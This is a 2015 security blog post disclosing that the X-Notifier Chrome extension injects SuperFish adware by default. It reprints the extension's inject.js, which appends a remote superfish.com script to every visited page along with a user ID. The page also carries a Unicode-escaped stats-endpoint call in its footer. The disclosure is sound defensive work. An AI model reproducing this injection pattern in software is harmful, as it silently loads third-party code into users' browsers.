<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>SuperFish AdWare Found Inside X-Notifier Browser Extension Code. | evilsocket</title>
<meta name="description" content="You probably already heard about SuperFish around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside insid">


  <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">


<link rel="icon" href="/images/favicon.ico">

<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="SuperFish AdWare Found Inside X-Notifier Browser Extension Code.">
<meta property="og:description" content="You probably already heard about SuperFish around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside insid">
<meta property="og:url" content="/2015/02/20/SuperFish-AdWare-found-inside-X-Notifier-browser-extension-code/">
<meta property="og:site_name" content="evilsocket">

  
  
    <meta property="og:image" content="/images/2015/02/Schermata-2015-02-20-alle-18-22-34.png">
  


<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="SuperFish AdWare Found Inside X-Notifier Browser Extension Code.">
<meta name="twitter:description" content="You probably already heard about SuperFish around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside insid">

<!-- Schema.org JSON-LD -->


<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.evilsocket.net/2015/02/20/SuperFish-AdWare-found-inside-X-Notifier-browser-extension-code/"},"headline":"SuperFish AdWare Found Inside X-Notifier Browser Extension Code.","description":"You probably already heard about SuperFish around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside insid","image":"https://www.evilsocket.net/images/2015/02/Schermata-2015-02-20-alle-18-22-34.png","datePublished":"2015-02-20T17:39:05.000Z","dateModified":"2015-02-20T17:55:15.000Z","author":{"@type":"Person","name":"Simone Margaritelli","description":"Italian cybersecurity researcher, hacker, and open-source developer with over two decades of experience in network security, AI, and offensive security tools.","url":"https://www.evilsocket.net","image":"https://www.evilsocket.net/images/glider.png","sameAs":["https://github.com/evilsocket","https://twitter.com/evilsocket","http://it.linkedin.com/in/simonemargaritelli/","https://www.goodreads.com/evilsocket","https://www.patreon.com/evilsocket","https://keybase.io/evilsocket"],"jobTitle":"Security Researcher","knowsAbout":["Cybersecurity","Penetration Testing","Network Security","Reverse Engineering","Open Source Development","Wireless Security","Machine Learning","Go Programming","Python","C/C++"],"award":["Creator of bettercap","Creator of pwnagotchi","Creator of OpenSnitch","CVE-2024-47176 discoverer"],"worksFor":{"@type":"Organization","name":"Independent"}},"publisher":{"@type":"Organization","name":"evilsocket","url":"https://www.evilsocket.net","logo":{"@type":"ImageObject","url":"https://www.evilsocket.net/images/glider.png"}},"keywords":"malware, adware, superfish, chrome, xnotifier, x-notifier, extension, browser, inject, adv, browser security, ssl interception, supply chain","articleSection":"Cybersecurity","inLanguage":"en"}
</script>


<!-- Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="/css/style.css">


<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-22026549-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-22026549-1');
</script>


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="post-page">
  <header class="site-header">
  <div class="header-inner">
    <div class="site-branding">
      <a href="/" class="site-logo">
        
          <img src="/images/glider.png" alt="evilsocket" width="50" height="50">
        
        <div class="site-title-group">
          <span class="site-title">evilsocket</span>
          <span class="site-motto">Preoccupied with a single leaf, you won't see the tree. Preoccupied with a single tree... you'll miss the entire forest.</span>
        </div>
      </a>
    </div>
    
    <nav class="site-nav">
      
        <a href="/" class="nav-link">
          HOME
        </a>
      
        <a href="/atom.xml" class="nav-link">
          RSS
        </a>
      
    </nav>
  </div>
</header>

  
  <main class="main-content">
    <article class="post-full">
  <header class="post-header">
    <h1 class="post-title">SuperFish AdWare Found Inside X-Notifier Browser Extension Code.</h1>
    <div class="post-meta">
      BY <span class="post-author">Simone Margaritelli</span>
      — <time datetime="2015-02-20T17:39:05.000Z">20 Feb 2015</time>
      
        — <a href="/tags/malware/" class="post-category">malware</a>, <a href="/tags/adware/" class="post-category">adware</a>, <a href="/tags/superfish/" class="post-category">superfish</a>, <a href="/tags/chrome/" class="post-category">chrome</a>, <a href="/tags/xnotifier/" class="post-category">xnotifier</a>, <a href="/tags/x-notifier/" class="post-category">x-notifier</a>, <a href="/tags/extension/" class="post-category">extension</a>, <a href="/tags/browser/" class="post-category">browser</a>, <a href="/tags/inject/" class="post-category">inject</a>, <a href="/tags/adv/" class="post-category">adv</a>, <a href="/tags/browser-security/" class="post-category">browser security</a>, <a href="/tags/ssl-interception/" class="post-category">ssl interception</a>, <a href="/tags/supply-chain/" class="post-category">supply chain</a>
      
    </div>
    <br/>
    <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket" class="twitter-follow-button" data-show-count="false">Follow me on X</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
  </header>

  <div class="post-content">
    <p>You probably already heard about <strong>SuperFish</strong> around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside inside the adware itself, that basically just injects some advertisment inside user web searches, but in the fact that, in order to handle HTTPS search engines ( Google ), it installs a root CA on the computer and replaces every HTTPS certificate sent by the web server with this one, leaving the victim vulnerable to SLL man in the middle attacks.</p>
<p>As soon as I heard the name “SuperFish”, it suddenly was somehow familiar to me … “Where the hell did I hear this name before?”</p>
<span id="more"></span>

<p>And there it goes, I have the <a target="_blank" rel="noopener" href="http://xnotifier.tobwithu.com/"><strong>X-Notifier</strong></a> browser extension installed on Google Chrome, wich is very useful to handle multiple gmail accounts at once without using a desktop email client, this is its options panel:</p>
<p><img src="/images/2015/02/Schermata-2015-02-20-alle-18-22-34.png" alt="xnotifier options"></p>
<p>Look at the bottom left of the picture …. there you go, the extension offers an optional ( but turned on by default ) SuperFish injection :D</p>
<p>When enabled, you will find this request for each page you visit:</p>
<p><img src="/images/2015/02/Schermata-2015-02-20-alle-18-22-05.png" alt="superfish request"></p>
<p>And here’s the code ( xnotifier/js/inject.js ):</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  chrome.extension.sendMessage(&#123;<span class="attr">msg</span>:<span class="string">&quot;enabled&quot;</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(response.enabled)&#123;</span><br><span class="line">      <span class="keyword">var</span> script=<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">      script.type=<span class="string">&#x27;text/javascript&#x27;</span>;</span><br><span class="line">      script.src=<span class="built_in">document</span>.location.protocol + <span class="string">&quot;//www.superfish.com/ws/sf_main.jsp?dlsource=xnotifier&amp;userId=&quot;</span>+response.uid+<span class="string">&quot;&amp;CTID=xn-cr&quot;</span>;</span><br><span class="line">      <span class="keyword">var</span> h=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">      h.appendChild(script);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Fortunately the server seems to be down, but the domain itself is still active:</p>
<pre><code>Registrant Org: Superfish Inc. is associated with ~1 other domains
...
Domain Name: SUPERFISH.COM
Registrar: GODADDY.COM, LLC
Sponsoring Registrar IANA ID: 146
...
Updated Date: 21-sep-2014
Creation Date: 16-oct-2005
Expiration Date: 16-oct-2017
...</code></pre>
<p>So, apparently, Lenovo is not the only to use SuperFish services, that btw is not only an adware, but a whole company selling ads.</p>

  </div>

  
    <div class="post-tags">
      
        <a href="/tags/malware/" class="tag">#malware</a>
      
        <a href="/tags/adware/" class="tag">#adware</a>
      
        <a href="/tags/superfish/" class="tag">#superfish</a>
      
        <a href="/tags/chrome/" class="tag">#chrome</a>
      
        <a href="/tags/xnotifier/" class="tag">#xnotifier</a>
      
        <a href="/tags/x-notifier/" class="tag">#x-notifier</a>
      
        <a href="/tags/extension/" class="tag">#extension</a>
      
        <a href="/tags/browser/" class="tag">#browser</a>
      
        <a href="/tags/inject/" class="tag">#inject</a>
      
        <a href="/tags/adv/" class="tag">#adv</a>
      
        <a href="/tags/browser-security/" class="tag">#browser security</a>
      
        <a href="/tags/ssl-interception/" class="tag">#ssl interception</a>
      
        <a href="/tags/supply-chain/" class="tag">#supply chain</a>
      
    </div>
  

  <nav class="post-navigation">
    
      <a href="/2015/04/30/Fuzzing-with-AFL-Fuzz-a-Practical-Example-AFL-vs-binutils/" class="nav-prev">
        <span class="nav-label">PREVIOUS</span>
        <span class="nav-title">Fuzzing With AFL-Fuzz, a Practical Example ( AFL vs Binutils )</span>
      </a>
    
    
      <a href="/2015/02/12/RuberTooth-A-complete-Ruby-porting-of-the-ubertooth-libraries-and-utilities/" class="nav-next">
        <span class="nav-label">NEXT</span>
        <span class="nav-title">RuberTooth - a Complete Ruby Porting of the Ubertooth Libraries and Utilities.</span>
      </a>
    
  </nav>
</article>


  


<section class="related-posts">
  <h2 class="related-title">YOU MIGHT ALSO LIKE...</h2>
  <div class="cards-grid cards-grid-related">
    
      

<article class="card card-light">
  <a href="/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/" class="card-link">
    
      <div class="card-image" style="background-image: url('https://i.imgur.com/cBCBdlH.png')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">How to Create a Malware Detection System With Machine Learning</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2014/02/02/Process-introspection-for-fun-and-profit/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/default-cover.svg')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">Process Introspection for Fun and Profit</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2025/tapo/header.jpg')">
        
          <div class="card-overlay-content">
            <h2 class="card-title">TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy in the Era of AI Assisted Reverse Engineering</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-light">
  <a href="/2025/03/13/How-To-Write-An-Agent/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2025/agent/loop.png')">
        
      </div>
    
    
    
      <div class="card-content">
        <h2 class="card-title">How to Write an Agent</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
  </div>
</section>




  </main>
  
  <footer class="site-footer">
  <div class="footer-inner">
    <div class="footer-social">
      
        
          
            <a href="https://github.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
            </a>
          
        
          
            <a href="https://twitter.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
          
        
          
            <a href="http://it.linkedin.com/in/simonemargaritelli/" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
          
        
          
        
          
            <a href="mailto:evilsocket@gmail.com" class="social-link" aria-label="Email">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </a>
          
        
      
    </div>
    <p class="footer-copyright">
      &copy; 2026 evilsocket. 
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
    </p>
  </div>
</footer>

  <script src="/a.js"></script>
<script type="text/javascript">
  A['\u0069\u006E\u0069\u0074']({ '\u0061\u0063\u0074\u0069\u006F\u006E': 'none', "statsEndpoint": "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006E\u006F\u0062\u006F\u0074\u002D\u0073\u0074\u0061\u0074\u0073\u002E\u0065\u0076\u0069\u006C\u0073\u006F\u0063\u006B\u0065\u0074\u002E\u0077\u006F\u0072\u006B\u0065\u0072\u0073\u002E\u0064\u0065\u0076\u002F\u006C\u006F\u0067" });
</script>

<!-- Minimal JS - no external dependencies needed -->
<script>
  // Lazy load images
  document.addEventListener('DOMContentLoaded', function () {
    var images = document.querySelectorAll('.card-image[data-bg]');
    images.forEach(function (img) {
      img.style.backgroundImage = 'url(' + img.dataset.bg + ')';
    });
  });
</script>
</body>
</html>
